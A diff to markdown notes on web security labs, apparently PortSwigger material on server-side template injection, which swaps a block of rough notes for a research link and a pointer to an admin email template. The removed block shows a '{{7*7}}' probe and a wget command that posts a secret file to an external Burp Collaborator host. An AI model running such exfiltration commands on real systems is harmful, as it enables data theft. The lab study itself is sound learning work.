@@ -1587,20 +1587,9 @@ wrtz{{#with "s" as |string|}}
 [PortSwigger Lab: Server-side template injection in an unknown language](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)  
 
 
->Random notes on template injections  
+[PortSwigger Research SSTI](https://portswigger.net/research/server-side-template-injection)  
 
-```
-"Update forgot email template {{}}
-/admin_panel/update_forgot_email/
-POST request newemail parameter
-
-
-portswigger.net/research/server-side-template-injection
-{{7*7}}
-portswigger.net/research/template-injection
-
-wget http://ext.burpcollab.net --post-file=/home/carlos/secret
-```  
+>Note: ***Identify*** the Update forgot email template message under the admin_panel at the path /update_forgot_email.  
   
 ## ProtoType Pollution  
 
